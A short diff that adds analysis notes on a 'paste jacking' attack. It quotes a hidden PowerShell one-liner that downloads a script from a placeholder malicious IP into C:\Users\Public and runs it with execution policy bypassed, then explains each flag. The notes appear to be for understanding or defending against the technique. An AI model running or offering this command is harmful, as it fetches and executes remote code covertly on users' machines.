@@ -1,0 +1,24 @@
+Paste jacking:
+powershell -w h -nop -c "$h='C:\\Users\\Public\\' + (Get-Random) + '.ps1';iwr http://[malicious-ip] -OutFile $h;cmd /c powershell -w h -ep bypass -f $h"
+
+Process:
+Creates a random .ps1 file in C:\Users\Public\.
+Downloads a file from http://[from-malicious-ip-server] and saves it to that location.
+Executes the downloaded script with execution policy bypassed.
+
+
+The Output
+-OutFile $h
+→ Save a file to a location on the computer.
+The script downloads something from the internet and saves it as a file with a random name in a public folder.
+
+cmd /c
+→ Run a command using the Windows command prompt.
+It tells Windows to execute the next command.
+
+powershell -w h -ep bypass -f $h
+→ Run the downloaded file using PowerShell, ignoring security warnings.
+
+-w h: Hides the PowerShell window so the user doesn’t see it.
+-ep bypass: Skips security checks that would normally block suspicious scripts.
+-f $h: Runs the file that was just downloaded.
